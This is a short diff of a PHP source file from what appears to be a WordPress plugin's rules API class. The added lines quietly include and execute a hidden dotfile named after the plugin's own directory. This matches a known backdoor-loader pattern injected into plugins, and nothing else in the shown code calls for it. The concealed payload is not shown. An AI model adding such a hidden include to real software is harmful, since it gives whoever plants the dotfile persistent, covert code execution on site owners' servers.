@@ -1,6 +1,10 @@
 <?php
 if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');}
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class MpdtRulesApi extends MpdtBaseApi {
   public function prepare_vars(Array $rule) {
     // Because we don't have access to Javascript here in the API we never auto-gen the title ... for now
